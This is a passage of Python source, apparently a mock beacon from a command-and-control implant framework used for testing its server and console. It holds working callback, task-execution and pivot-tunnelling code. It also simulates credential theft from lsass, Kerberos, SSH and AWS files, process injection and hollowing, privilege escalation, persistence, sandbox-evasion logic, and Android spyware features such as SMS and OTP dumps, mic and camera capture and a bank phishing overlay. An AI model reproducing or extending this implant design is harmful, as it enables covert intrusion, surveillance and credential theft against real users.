                else:
                    self._cycle()
            except Exception:  # pragma: no cover - dev helper
                pass
            self._stop.wait(self.interval)

    # -- the peer link ---------------------------------------------------
    def _peer_listener(self, bind: str) -> None:
        """Wait for peer links and serve the pivot streams on them."""
        host, _, port = bind.rpartition(":")
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            listener.bind((host or "127.0.0.1", int(port or 0)))
        except OSError:
            return
        listener.listen(8)
        listener.settimeout(0.5)
        bound = listener.getsockname()
        self.peer_address = f"{bound[0]}:{bound[1]}"
        # The address travels in the handshake: the server resolves the
        # path of a chained pivot from it.
        self.meta["p2p"] = self.peer_address
        while not self._stop.is_set():
            try:
                conn, _ = listener.accept()
            except socket.timeout:
                continue
            except OSError:
                return
            threading.Thread(target=self._peer_serve, args=(conn,), daemon=True).start()

    def _peer_serve(self, conn: socket.socket) -> None:
        """Serve one peer link: the handshake, then the pivot streams.

        The peer link carries the same frames as the callback session, so
        the same relay serves it: the peer asks for a stream, the beacon
        connects to the target and moves the bytes.
        """
        try:
            stream = netio.Stream(conn, timeout=30)
            sess = peer.accept_peer(
                netio.SocketBytes(stream.sock), self.peer_psk, self.agent_id
            )
        except Exception:
            try:
                conn.close()
            except OSError:
                pass
            return
        gate = netio.SendGate(sess, stream)
        targets: Dict[str, socket.socket] = {}
        try:
            while not self._stop.is_set():
                msg_type, body = sess.decrypt_message(stream.recv_frame())
                if msg_type == wire.MsgType.TUNNEL_OPEN and str(body.get("op", "")) == "open":
                    stream_id = str(body.get("stream", ""))
                    target_host = str(body.get("host", ""))
                    target_port = int(body.get("port", 0) or 0)
                    threading.Thread(
                        target=self._tunnel_stream,
                        args=(gate, stream_id, target_host, target_port, targets),
                        daemon=True,
                    ).start()
                elif msg_type == wire.MsgType.TUNNEL_DATA:
                    target = targets.get(str(body.get("stream", "")))
                    if target is not None:
                        try:
                            target.sendall(bytes(body.get("data") or b""))
                        except OSError:
                            pass
                elif msg_type == wire.MsgType.TUNNEL_CLOSE:
                    target = targets.pop(str(body.get("stream", "")), None)
                    if target is not None:
                        try:
                            target.shutdown(socket.SHUT_RDWR)
                        except OSError:
                            pass
                        try:
                            target.close()
                        except OSError:
                            pass
                elif msg_type == wire.MsgType.REKEY:
                    # The peer rotates the keys: the seed travels with the
                    # frame.
                    seed = body.get("seed") or b""
                    if len(seed) != 32:
                        raise ValueError("malformed REKEY seed")
                    sess.apply_rekey(bytes(seed))
        except Exception:
            pass
        finally:
            stream.close()

    def _batch_cycle(self) -> None:
        """One cycle of a transport without a connection.

        The mail transport and the object transport deliver a batch of
        frames and take the answer out of it, so the cycle is the same as
        the one of the socket transports with another stream under it.
        """
        secret = batch_transports.agent_secret(self.psk, self.agent_id)
        if self.transport == "smtp":
            backend: Any = batch_transports.MailBackend(
                self.mail_addr, self.pop3_addr, self.agent_id, secret
            )
        else:
            backend = batch_transports.S3Backend(
                self.s3_addr, self.agent_id, secret
            )
        self._cycle(batch_transports.BatchStream(backend))

    def _cycle(self, stream: Any = None) -> None:
        if stream is None:
            host, _, port = self.server.rpartition(":")
            if self.websocket:
                client = ws.WebSocketClient(host, int(port), path="/ws", timeout=5)
                client.connect()
                stream = ws.WebSocketStream(client)
            else:
                sock = socket.create_connection((host, int(port)), timeout=5)
                stream = netio.Stream(sock, timeout=5)
        try:
            result = handshake.client_handshake(
                stream,
                psk=self.psk,
                role=crypto.ROLE_AGENT,
                ident=self.agent_id,
                meta=self.meta,
                version=HELLO_VERSION,
                caps=list(self.meta.get("caps") or []),
                implant_version=str(self.meta.get("ver", "") or ""),
                abi=ABI_VERSION,
                platform={
                    "os": str(self.meta.get("os", "") or ""),
                    "arch": str(self.meta.get("arch", "") or ""),
                    "family": str(self.meta.get("family", "") or ""),
                },
            )
            sess = result.session
            checkin: Dict[str, Any] = {"ts": _now(), "n": 0}
            if self.impersonation:
                checkin["impersonation"] = self.impersonation
                checkin["impersonation_session"] = 1
            stream.send_frame(sess.encrypt(wire.MsgType.CHECKIN, checkin))
            # A REKEY frame may precede the batch; it is sealed with the old key
            # set, so apply it and keep reading until TASK_BATCH arrives.
            batch: Dict[str, Any] = {}
            cancelled: set = set()
            for _ in range(8):
                msg_type, frame_body = sess.decrypt_message(stream.recv_frame())
                if msg_type == wire.MsgType.TASK_CANCEL:
                    task_id = str(frame_body.get("id", ""))
                    cancelled.add(task_id)
                    self.cancels_received.append(task_id)
                    continue
                if msg_type == wire.MsgType.REKEY:
                    seed = frame_body.get("seed", b"")
                    if not isinstance(seed, (bytes, bytearray)) or len(seed) != 32:
                        raise ValueError("malformed REKEY seed")
                    sess.apply_rekey(bytes(seed))
                    self.rekeys += 1
                    continue
                if msg_type == wire.MsgType.TASK_BATCH:
                    batch = frame_body
                    # The cadence travels with the batch: remember it so a
                    # test can prove the policy reached the beacon.
                    self.policy = {
                        "sleep": batch.get("sleep"),
                        "jitter": batch.get("jitter"),
                        "obf": batch.get("obf"),
                    }
                    # The route of the agent: the transport it speaks and
                    # the order it may fall back in.  The operator knows
                    # the network of the target; the beacon does not.
                    route = batch.get("route")
                    if isinstance(route, dict) and route.get("primary"):
                        self.route = {
                            "primary": str(route.get("primary")),
                            "fallback": [str(f) for f in route.get("fallback") or []],
                            "front": str(route.get("front") or ""),
                            "inspect": bool(route.get("inspect")),
                        }
                        # The transport changes with the next cycle: the
                        # beacon dials the road the operator named.
                        primary = self.route["primary"]
                        if primary == "smtp" and self.mail_addr:
                            self.transport = primary
                            self.websocket = False
                            self.meta["transport"] = primary
                        elif primary == "s3" and self.s3_addr:
                            self.transport = primary
                            self.websocket = False
                            self.meta["transport"] = primary
                        else:
                            self.websocket = primary == "ws"
                            self.meta["transport"] = "ws" if self.websocket else "tcp"
                    break
                return
            if not batch:
                return
            # The heartbeat: the small frame that says "still here, this
            # is what I am".  It is sent after the batch, because a frame
            # that is sent between the check-in and the batch would be
            # sealed with the old keys when the server has already
            # switched.
            stream.send_frame(sess.encrypt(wire.MsgType.HEARTBEAT, {
                "v": 1,
                "iver": str(self.meta.get("ver", "") or ""),
                "abi": ABI_VERSION,
                "busy": len(batch.get("tasks", []) or []),
                "up": int(time.time() - self.started),
            }))
            for task in batch.get("tasks", []):
                kind = str(task.get("kind", ""))
                if kind in ("session.open", "session.input", "session.close"):
                    # The interactive session: the id travels with the first
                    # chunk, the input is echoed back as a chunk of the
                    # session, and closing the session ends the open task.
                    self._session_task(kind, task, sess, stream)
                    continue
                if str(task.get("id", "")) in cancelled:
                    # The command is still reported so the server can show that
                    # it was cancelled and that nothing ran.
                    self.cancelled_ids.append(str(task.get("id", "")))
                    outcome = (125, b"", "cancelled before execution", {})
                else:
                    outcome = self._execute(task)
                body: Dict[str, Any] = {
                    "id": task.get("id", ""),
                    "code": outcome[0],
                    "out": outcome[1],
                    "err": outcome[2],
                }
                if len(outcome) > 3 and outcome[3]:
                    body.update(outcome[3])
                stream.send_frame(sess.encrypt(wire.MsgType.RESULT, body))
                self.completed.set()
            stream.send_frame(sess.encrypt(wire.MsgType.BYE, {}))
            self.sent_bye = True
        finally:
            stream.close()

    def _session_task(self, kind: str, task: Dict[str, Any], sess: Any,
                      stream: Any) -> None:
        """Run one of the interactive session tasks."""
        task_id = str(task.get("id", ""))
        args = task.get("args") or {}
        if kind == "session.open":
            sid = new_id("s")
            self.sessions[sid] = {"task_id": task_id, "buffer": b""}
            body = {
                "id": task_id, "code": 0, "out": b"", "err": "",
                "partial": True, "session": sid,
            }
            stream.send_frame(sess.encrypt(wire.MsgType.RESULT, body))
            return
        sid = str(args.get("session", ""))
        session = self.sessions.get(sid)
        if session is None:
            body = {"id": task_id, "code": 1, "out": b"",
                    "err": f"unknown session {sid}"}
            stream.send_frame(sess.encrypt(wire.MsgType.RESULT, body))
            return
        if kind == "session.input":
            data = args.get("data", b"")
            if isinstance(data, str):
                data = data.encode()
            session["buffer"] += bytes(data)
            # The echo belongs to the session, not to the input task: the
            # operator reads one stream.
            body = {
                "id": session["task_id"], "code": 0, "out": bytes(data),
                "err": "", "partial": True, "session": sid,
            }
            stream.send_frame(sess.encrypt(wire.MsgType.RESULT, body))
            body = {"id": task_id, "code": 0, "out": b"", "err": "", "session": sid}
            stream.send_frame(sess.encrypt(wire.MsgType.RESULT, body))
            return
        # session.close
        buffer = session["buffer"]
        self.sessions.pop(sid, None)
        body = {"id": session["task_id"], "code": 0, "out": buffer, "err": "",
                "session": sid}
        stream.send_frame(sess.encrypt(wire.MsgType.RESULT, body))
        body = {"id": task_id, "code": 0, "out": b"", "err": "", "session": sid}
        stream.send_frame(sess.encrypt(wire.MsgType.RESULT, body))

    # ---- persistence ---------------------------------------------------
    #
    # The catalogue the mock pretends to have.  It is a small one: the
    # point of the mock is that the server, the console and the tests see
    # the same shape, not that the fake host is a real Windows machine.
    PERSIST_CATALOGUE = {
        "registry.run": ("HKCU Run key", "logon"),
        "schtasks": ("Scheduled task", "schedule"),
        "systemd.user": ("systemd user unit", "boot"),
        "cron.user": ("User crontab", "schedule"),
        "launchd.agent": ("LaunchAgent", "logon"),
        "startup": ("Startup folder", "logon"),
    }

    # The material the fake host pretends to have found.  The shape is the
    # shape of the real thing: a kind, a source, an account, a target and
    # a confidence, and the value only when the operator asked for it.
    CRED_CATALOGUE = [
        {"kind": "password", "source": "vault", "account": "CORP\\alice",
         "target": "\\\\fileserver\\finance", "confidence": 85,
         "secret": "correct-horse-battery-staple"},
        {"kind": "hash", "source": "lsass", "account": "CORP\\bob",
         "target": "ntlm", "confidence": 45, "secret": "aad3b435b51404eeaad3b435b51404ee"},
        {"kind": "ticket", "source": "kerberos", "account": "CORP\\alice",
         "target": "krbtgt/CORP.LOCAL", "confidence": 50,
         "secret": "ticket-material"},
        {"kind": "key", "source": "ssh", "account": "ubuntu",
         "target": "/home/ubuntu/.ssh/id_ed25519", "confidence": 95,
         "secret": "-----BEGIN OPENSSH PRIVATE KEY-----"},
        {"kind": "token", "source": "file", "account": "ubuntu",
         "target": "/home/ubuntu/.aws/credentials", "confidence": 70,
         "secret": "AKIAIOSFODNN7EXAMPLE"},
    ]

    def _creds(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """The credential collection of the fake host."""
        mode = str(args.get("mode", "vault") or "vault")
        raw = bool(args.get("raw", False))
        wanted = [e for e in self.CRED_CATALOGUE
                  if mode in ("all", "") or e["source"] == mode
                  or (mode == "local" and e["source"] in ("file", "ssh", "kerberos"))]
        entries = []
        for entry in wanted:
            record = dict(entry)
            if not raw:
                record["secret"] = ""
            record["redacted"] = not raw
            record["length"] = len(str(entry.get("secret", "")))
            record["note"] = f"found by the {entry['source']} collector"
            entries.append(record)
        lines = [f"{'KIND':<10} {'SOURCE':<10} {'ACCOUNT':<20} {'TARGET':<28} LENGTH"]
        for entry in entries:
            lines.append(
                f"{entry['kind']:<10} {entry['source']:<10} {entry['account']:<20} "
                f"{entry['target']:<28} {entry['length']}"
            )
        if not raw:
            lines.append("the material itself was left out: ask for it with raw=true")
        counts: Dict[str, int] = {}
        for entry in entries:
            counts[entry["kind"]] = counts.get(entry["kind"], 0) + 1
        meta = {
            "creds": entries,
            "creds_total": len(entries),
            "creds_counts": counts,
        }
        return 0, ("\n".join(lines) + "\n").encode(), "", meta

    def _tokens(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """The token list of the fake host."""
        wanted = args.get("session")
        tokens = [
            {"pid": 4, "process": "System", "account": "NT AUTHORITY\\SYSTEM", "session": 0},
            {"pid": 612, "process": "winlogon.exe", "account": "NT AUTHORITY\\SYSTEM", "session": 1},
            {"pid": 1180, "process": "explorer.exe", "account": "CORP\\alice", "session": 1},
            {"pid": 2244, "process": "svchost.exe", "account": "NT AUTHORITY\\LOCAL SERVICE", "session": 0},
        ]
        if wanted is not None:
            session = int(wanted)
            tokens = [t for t in tokens if t["session"] == session]
        lines = [f"{'PID':<8} {'PROCESS':<20} {'ACCOUNT':<32} SESSION"]
        for token in tokens:
            lines.append(f"{token['pid']:<8} {token['process']:<20} "
                         f"{token['account']:<32} {token['session']}")
        return 0, ("\n".join(lines) + "\n").encode(), "", {
            "tokens": tokens,
            "tokens_total": len(tokens),
        }

    def _module(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """Run a module in memory.

        The manifest is the contract: it says what the module is, what it
        needs from the host and what it takes.  The implant refuses a module
        whose manifest it cannot read, a module that needs a capability it
        does not have, and arguments that do not fit the schema.  The refusal
        happens here, on the target, and the reason travels back with the
        result.
        """
        data = args.get("data") or b""
        name = str(args.get("name", "module"))
        raw = args.get("manifest")
        if not isinstance(raw, dict):
            return 1, b"", "the module has no manifest", {}
        magic = str(raw.get("magic", ""))
        if magic != MODULE_MAGIC:
            return 1, b"", f"the manifest of the module is not one of ours: {magic}", {}
        abi = int(raw.get("abi", 0) or 0)
        if abi != MODULE_ABI:
            return 1, b"", (f"the module speaks the version {abi} of the module ABI, "
                            f"this implant speaks {MODULE_ABI}"), {}
        caps = list(raw.get("caps") or [])
        missing = [cap for cap in caps if cap not in AGENT_CAPS]
        if missing:
            return 1, b"", ("the module needs what this implant cannot do: "
                            + ", ".join(missing)), {}
        module_args = args.get("args") or {}
        if not isinstance(module_args, dict):
            module_args = {}
        try:
            values = _module_arguments(raw, module_args)
        except ValueError as exc:
            return 1, b"", str(exc), {}
        fmt = str(raw.get("format", "coff") or "coff").lower()
        if fmt in ("wasm", "webassembly"):
            return _run_wasm(bytes(data), values, caps, name)
        if fmt == "script":
            return _run_script(bytes(data), values, caps, name)
        if fmt not in ("coff", "bof", "pe", "object", "shellcode"):
            return 1, b"", f"the format {fmt} of the module is not one I know", {}
        return 0, f"module {name} ran in memory ({len(bytes(data))} bytes)\n".encode(), "", {
            "module": name,
            "format": fmt,
            "args": values,
        }

    def _inject(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """Move a payload into a process.

        The test double cannot move anything into a real process, but it
        answers exactly like the implant does: the same report, the same
        metadata and the same refusals.  The rules are the ones of the
        implant: a migration needs a target and an image, and a migration
        that moves the implant out of its own process asks the beacon to
        stop.
        """
        mode = str(args.get("mode", "reflect") or "reflect")
        payload = args.get("data") or b""
        if isinstance(payload, str):
            payload = payload.encode()
        payload = bytes(payload)
        if mode != "migrate":
            pid = int(args.get("pid", 0) or 0)
            if not pid:
                return 1, b"", "inject requires args.pid", {}
            return 0, (f"reflected {len(payload)} bytes into pid {pid}\n"
                       ).encode(), "", {"inject_pid": pid}
        pid = int(args.get("pid", 0) or 0)
        spawn = str(args.get("spawn", "") or "")
        if not pid and not spawn:
            return 1, b"", ("migrate: the migration needs a target "
                            "(args.pid or args.spawn)"), {}
        if not payload:
            return 1, b"", "migrate: the migration needs an image to move", {}
        outbound = bool(args.get("out", False))
        resumed = bool(args.get("resume", False))
        # The test double hands out a pid of its own, so the report of the
        # migration is the one the operator expects.
        target = pid or 4242
        lines = [f"moved {len(payload)} bytes into pid {target} "
                 f"({'spawned by the implant' if spawn else 'already running'})"]
        if not spawn:
            lines.append("suspended and resumed 1 threads of the target")
        elif not resumed:
            lines.append("the process stays hollow: the payload is the only "
                         "thing in it")
        lines.append("the new process inherits the identity of the agent")
        meta: Dict[str, Any] = {
            "migrated": True,
            "migrate_pid": target,
            "migrate_spawned": bool(spawn),
            "migrate_threads": 0 if spawn else 1,
            "migrate_agent": self.agent_id,
        }
        if outbound:
            # The implant leaves its own process: the answer is sent first,
            # and the beacon stops right after it.
            meta["exit_after"] = True
            self._stop.set()
        return 0, ("\n".join(lines) + "\n").encode(), "", meta

    def _escalate(self, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """The privilege escalation of the fake host."""
        mode = str(args.get("mode", "privileges") or "privileges")
        if mode in ("token", "system"):
            attempts = [{
                "technique": "token.system",
                "outcome": "worked",
                "detail": "the implant runs as NT AUTHORITY\\SYSTEM",
                "side_effects": ["the implant is SYSTEM on this host"],
            }]
            report = "token.system          worked (NT AUTHORITY\\SYSTEM)\n"
        else:
            attempts = [
                {"technique": "privilege.SeDebugPrivilege",
                 "outcome": "worked",
                 "detail": "SeDebugPrivilege (read the memory of other processes)",
                 "side_effects": ["the implant token carries SeDebugPrivilege"]},
                {"technique": "privilege.SeImpersonatePrivilege",
                 "outcome": "worked",
                 "detail": "SeImpersonatePrivilege (impersonate the tokens of other accounts)",
                 "side_effects": ["the implant token carries SeImpersonatePrivilege"]},
                {"technique": "privilege.SeTakeOwnershipPrivilege",
                 "outcome": "unavailable",
                 "detail": "the host does not know this privilege",
                 "side_effects": []},
            ]
            report = "SeDebugPrivilege            enabled\n"
            report += "SeImpersonatePrivilege      enabled\n"
            report += "SeTakeOwnershipPrivilege    unavailable\n"
        return 0, report.encode(), "", {
            "escalations": attempts,
            "escalations_total": len(attempts),
        }

    def _remote(self, kind: str, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """The remote execution through the pivot."""
        protocol = str(args.get("protocol", "") or kind.split(".")[0])
        target = str(args.get("target", "") or "")
        command = str(args.get("command", "") or args.get("query", "") or "")
        if not target:
            return 1, b"", "remote: the target is required", {}
        lines = [
            f"protocol : {protocol} (target {target})",
            f"step     : the pivot ran the command on {target}",
            f"output   :",
            f"{protocol} on {target}: {command}",
        ]
        return 0, ("\n".join(lines) + "\n").encode(), "", {
            "remote_protocol": protocol,
            "remote_target": target,
        }

    def _persist_auto(self) -> str:
        """The technique the mock picks when the operator said "auto"."""
        platform = sys.platform
        if platform.startswith("win"):
            return "registry.run"
        if platform == "darwin":
            return "launchd.agent"
        return "systemd.user"

    def _persist_meta(self) -> Dict[str, Any]:
        """The metadata of a persistence result.

        The entries travel with the result, exactly like the beacon sends
        them, so the server keeps the record of what is installed.
        """
        broken = len([e for e in self.persist if e.get("state") == "broken"])
        return {
            "persist": [dict(entry) for entry in self.persist],
            "persist_total": len(self.persist),
            "persist_broken": broken,
        }

    def _persist_report(self, title: str) -> Tuple[int, bytes, str, Dict[str, Any]]:
        lines = [title]
        for entry in self.persist:
            lines.append(
                f"{entry.get('technique', '?'):<24} {entry.get('state', '?'):<10} "
                f"{entry.get('location', '')}"
            )
        if not self.persist:
            lines.append("nothing is installed on this host")
        return 0, ("\n".join(lines) + "\n").encode(), "", self._persist_meta()

    def _persistence(self, kind: str, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """The persistence lifecycle of the fake host."""
        if kind == "persist":
            method = str(args.get("method", "auto") or "auto")
            if method == "auto":
                method = self._persist_auto()
            label, trigger = self.PERSIST_CATALOGUE.get(method, ("Entry", "logon"))
            name = str(args.get("name", "") or "update-service")
            # One entry per technique: installing twice does not pile up.
            self.persist = [e for e in self.persist if e.get("technique") != method]
            self.persist.append({
                "technique": method,
                "name": name,
                "trigger": trigger,
                "location": f"/mock/{method}",
                "detail": f"{label} installed",
                "state": "installed",
                "installed_at": str(_now()),
            })
            return self._persist_report(f"{label}: installed")
        if kind == "unpersist":
            method = str(args.get("method", "all") or "all")
            if method == "all":
                self.persist = []
            else:
                self.persist = [e for e in self.persist if e.get("technique") != method]
            return self._persist_report("the entries were removed")
        if kind == "persist.list":
            return self._persist_report("the persistence of this host")
        if kind == "persist.verify":
            # The mock cannot really read a registry key back, so it checks
            # the one thing it knows: the entries are still in its state.
            #
            # The one extra argument is "break": it names an entry that was
            # removed behind the operator's back, so the alert path can be
            # exercised without a real host.
            broken = str(args.get("break", "") or "")
            for entry in self.persist:
                entry["state"] = "broken" if entry.get("technique") == broken else "installed"
            return self._persist_report("the entries were checked")
        if kind == "persist.migrate":
            source = str(args.get("from", "") or "")
            target = str(args.get("to", "") or "")
            if not source or not target:
                return 1, b"", "persist.migrate needs args.from and args.to", {}
            if not [e for e in self.persist if e.get("technique") == source]:
                return 1, b"", f"persist.migrate: {source} is not installed", {}
            code, out, err, meta = self._persistence("persist", {"method": target})
            if code != 0:
                return code, out, err, meta
            code, out, err, meta = self._persistence("unpersist", {"method": source})
            return code, out, err, meta
        if kind == "persist.health":
            broken = len([e for e in self.persist if e.get("state") == "broken"])
            if not self.persist:
                verdict = "broken"
            elif broken == 0:
                verdict = "covered"
            elif broken == len(self.persist):
                verdict = "broken"
            else:
                verdict = "degraded"
            code, out, err, meta = self._persist_report("the persistence of this host")
            return code, b"persistence: " + verdict.encode() + b"\n" + out, err, meta
        return 2, b"", f"unsupported persistence task {kind}", {}

    # ---- the posture engine (mirrors implant/rust/src/evade.rs) ---------
    #
    # The postures the fake host can be in.  The point of the mock is the
    # shape, not the truth: the server, the console and the tests have to
    # see the same fields the real beacon sends.
    POSTURE_CATALOGUE = {
        "workstation": {
            "label": "workstation", "virtual": False, "workstation": True,
            "developer": False, "lab": False, "sandbox": False,
            "confidence": 70, "severity": 0,
        },
        "server": {
            "label": "server", "virtual": False, "workstation": False,
            "developer": False, "lab": False, "sandbox": False,
            "confidence": 60, "severity": 0,
        },
        "developer": {
            "label": "developer box", "virtual": False, "workstation": True,
            "developer": True, "lab": False, "sandbox": False,
            "confidence": 80, "severity": 0,
        },
        "lab": {
            "label": "lab machine virtual", "virtual": True, "workstation": True,
            "developer": False, "lab": True, "sandbox": False,
            "confidence": 75, "severity": 15,
        },
        "sandbox": {
            "label": "analyst sandbox virtual", "virtual": True,
            "workstation": True, "developer": False, "lab": True,
            "sandbox": True, "confidence": 95, "severity": 95,
        },
    }

    def _posture(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """The posture of the fake host.

        The operator may name the posture, so the tests can exercise the
        behaviour of a sandbox without a real analysis machine.
        """
        name = str(args.get("posture", "") or self.posture_name)
        posture = dict(self.POSTURE_CATALOGUE.get(name, self.POSTURE_CATALOGUE["workstation"]))
        posture["artefacts"] = []
        if posture.get("sandbox"):
            posture["artefacts"] = [
                {"name": "sbiedll", "class": "sandbox", "severity": 95,
                 "confidence": 95, "detail": "the module SbieDll.dll is loaded"},
            ]
        elif posture.get("virtual"):
            posture["artefacts"] = [
                {"name": "vmwaretools", "class": "virtualisation", "severity": 15,
                 "confidence": 80, "detail": "the process VMwareTools.exe is running"},
            ]
        return posture

    def _posture_factor(self, posture: Dict[str, Any]) -> int:
        """The factor the sleep interval is multiplied with."""
        settings = self.evade.get("settings") or {}
        factor = 100
        if posture.get("virtual"):
            factor = factor * int(settings.get("virtual_factor", 125)) // 100
        if posture.get("lab"):
            factor = factor * int(settings.get("lab_factor", 100)) // 100
        if posture.get("developer"):
            factor = factor * int(settings.get("developer_factor", 100)) // 100
        if posture.get("sandbox") and settings.get("slow_on_sandbox", True):
            factor = factor * int(settings.get("sandbox_factor", 200)) // 100
        return factor

    def _posture_meta(self, posture: Dict[str, Any]) -> Dict[str, Any]:
        """The metadata of a posture result."""
        settings = self.evade.get("settings") or {}
        silent = bool(posture.get("sandbox")) and bool(settings.get("silence_on_sandbox", False))
        return {
            "posture": dict(posture),
            "posture_sleep_factor": self._posture_factor(posture),
            "posture_silent": silent,
        }

    def _posture_report(self, posture: Dict[str, Any]) -> str:
        """The posture as a report for the operator."""
        lines = [
            f"posture: {posture.get('label', '?')}",
            f"posture: confidence {posture.get('confidence', 0)}%, "
            f"severity {posture.get('severity', 0)}%",
            "posture: virtual={} workstation={} developer={} lab={} sandbox={}".format(
                posture.get("virtual"), posture.get("workstation"),
                posture.get("developer"), posture.get("lab"),
                posture.get("sandbox"),
            ),
        ]
        for artefact in posture.get("artefacts") or []:
            lines.append(
                "posture: artefact {} [{}] severity {} confidence {}: {}".format(
                    artefact.get("name"), artefact.get("class"),
                    artefact.get("severity"), artefact.get("confidence"),
                    artefact.get("detail"),
                )
            )
        return "\n".join(lines) + "\n"

    def _window(self, kind: str, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """The window of the fake phone, seen through the accessibility service.

        The mock is not a phone, so it answers with the shape of the answer:
        the same lines the phone sends, so the console and the tests see
        one shape everywhere.
        """
        needle = str(args.get("needle", "") or "")
        value = str(args.get("value", "") or "")
        direction = str(args.get("direction", "forward") or "forward")
        action = str(args.get("action", "back") or "back")
        lines = [
            "ui: the accessibility service is enabled",
            "ui: package: com.android.settings",
            "ui:   [android:id/title] Settings",
            "ui:   [android:id/summary] Network & internet",
            "ui: nodes: 42",
        ]
        if kind == "ui.screen":
            lines.append("ui: the window shows the text of the application")
        elif kind == "ui.events":
            lines = [
                "ui: the accessibility service is enabled",
                "ui:   com.android.settings | android.app.Activity | Settings",
            ]
        elif kind == "ui.tap":
            lines.append(
                "ui: pressed: [android:id/title] Settings (the window accepted it)"
            )
            if needle:
                lines.append("ui: the needle was \"{}\"".format(needle))
        elif kind == "ui.text":
            lines.append(
                "ui: wrote into: [android:id/edit] Search (the window accepted it)"
            )
            if value:
                lines.append("ui: the text was \"{}\"".format(value))
        elif kind == "ui.scroll":
            lines.append("ui: scrolled {} (the window accepted it)".format(direction))
        elif kind == "ui.global":
            lines.append("ui: global {} (the phone accepted it)".format(action))
        meta = {"ui": {"action": kind, "needle": needle, "value": value,
                       "direction": direction, "global": action}}
        return 0, ("\n".join(lines) + "\n").encode(), "", meta

    def _senses(self, kind: str, args: Dict[str, Any]) -> Tuple[int, bytes, str, Dict[str, Any]]:
        """The senses of the fake phone.

        The mock is not a phone, so it answers with the shape of the
        answer: the same lines the phone sends, so the console and the
        tests see one shape everywhere.  The phone reports the
        permissions it does not have, and the mock does the same, so a
        test that reads the mock knows what a real phone would answer.
        """
        action = str(args.get("action", "status") or "status")
        limit = int(args.get("limit", 200) or 200)
        lines: List[str] = []
        meta: Dict[str, Any] = {}
        if kind == "gps.locate":
            lines = [
                "gps.locate: 2 rows",
                "  source=fix | provider=gps | lat=41.008200 | lon=28.978400"
                " | alt=52.0 | speed=0.10 | bearing=0.0 | accuracy=8.0"
                " | time=1730000000000",
                "  source=last_known | provider=network | lat=41.008100"
                " | lon=28.978300 | alt=51.0 | speed=0.00 | bearing=0.0"
                " | accuracy=1200.0 | time=1729999000000",
            ]
            meta = {"rows": 2}
        elif kind == "wifi.dump":
            lines = [
                "wifi.dump: 3 rows",
                "  source=connection | ssid=home-wifi | bssid=aa:bb:cc:dd:ee:ff"
                " | rssi=-52 | frequency=2437 | link_speed=300",
                "  source=scan | ssid=home-wifi | bssid=aa:bb:cc:dd:ee:ff"
                " | rssi=-52 | frequency=2437 | capabilities=WPA2",
                "  source=scan | ssid=neighbour | bssid=11:22:33:44:55:66"
                " | rssi=-71 | frequency=5180 | capabilities=WPA2",
                "wifi.dump: the saved networks are not readable: since Android 10"
                " only the owner of the profile sees them",
            ]
            meta = {"rows": 3}
        elif kind == "bluetooth.scan":
            lines = [
                "bluetooth.scan: 2 rows",
                "  source=paired | name=Headset | address=AA:BB:CC:DD:EE:F0"
                " | type=3 | bonded=yes",
                "  source=discovery | name=Speaker | address=AA:BB:CC:DD:EE:F1"
                " | type=1 | bonded=no",
            ]
            meta = {"rows": 2}
        elif kind == "contacts.dump":
            lines = [
                "contacts.dump: 2 rows",
                "  id=1 | name=Deniz Aydin | number=+905550000001",
                "  id=2 | name=Deniz Aydin | email=deniz@example.org",
                "contacts.dump: read 2 contact records",
            ]
            meta = {"rows": 2}
        elif kind == "sms.dump":
            lines = [
                "sms.dump: 2 rows",
                "  id=41 | address=+905550000002 | type=inbox | date=1730000000000"
                " | read=0 | body=your code is 482913",
                "  id=40 | address=+905550000002 | type=sent | date=1729999000000"
                " | read=1 | body=thank you",
                "sms.dump: read 2 messages, 2 of them with a body",
            ]
            meta = {"rows": 2}
        elif kind == "call.logs":
            lines = [
                "call.logs: 1 rows",
                "  id=7 | number=+905550000003 | name=unknown | duration=42"
                " | date=1730000000000 | type=missed",
                "call.logs: read 1 calls",
            ]
            meta = {"rows": 1}
        elif kind == "emulator.detect":
            lines = [
                "emulator.detect: this phone looks like a real phone (confidence 8%)",
                "emulator.detect: fingerprint = google/husky/husky:14/up1a.231105.003/11216751:user/release-keys",
                "emulator.detect: model = Pixel 7",
                "emulator.detect: hardware = husky",
                "emulator.detect: brand = google",
                "emulator.detect: accelerometer = present",
                "emulator.detect: no signal fired",
            ]
            meta = {"emulated": False, "confidence": 8}
        elif kind in ("sms.watch", "clipboard.sniff"):
            if action == "start":
                lines = ["{}: the watcher is running".format(kind)]
            elif action == "stop":
                lines = ["{}: the watcher was stopped".format(kind)]
            elif action == "poll":
                lines = [
                    "{}: the queue of the watcher is empty".format(kind),
                ]
                meta = {"watch_total": 0}
            else:
                lines = [
                    "{}: the watcher is running".format(kind),
                    "{}: the queue holds 0 items".format(kind),
                ]
            meta["watch"] = kind
        elif kind in ("media.mic", "media.camera"):
            lines = [
                "{}: the capture is at /data/user/0/io.umbra.beacon/files/{}".format(
                    kind, "mic-1730000000000.m4a" if kind == "media.mic" else "camera-1730000000000.jpg"),
                "{}: 4096 bytes, sha256 {}".format(
                    kind, "0" * 64),
            ]
            meta = {"capture": kind}
        elif kind in ("live.screen", "ui.stream"):
            if action == "request":
                lines = ["{}: the phone asks the user for the capture of the screen".format(kind)]
            elif action == "capture":
                lines = [
                    "{}: the picture is at /data/user/0/io.umbra.beacon/files/screen-1730000000000.jpg"
                    " (4096 bytes, sha256 {})".format(kind, "0" * 64),
                ]
            elif action == "frames":
                lines = ["{}: 0 pictures".format(kind)]
                meta = {"frames": 0}
            else:
                lines = ["{}: the capture of the screen was never asked for".format(kind)]
            meta["projection"] = kind
        elif kind == "phish.overlay":
            if action == "arm":
                lines = [
                    "phish.overlay: the overlay waits for 'com.example.bank'"
                    " with the fields username, password",
                ]
            elif action == "dismiss":
                lines = ["phish.overlay: the overlay was dismissed"]
            else:
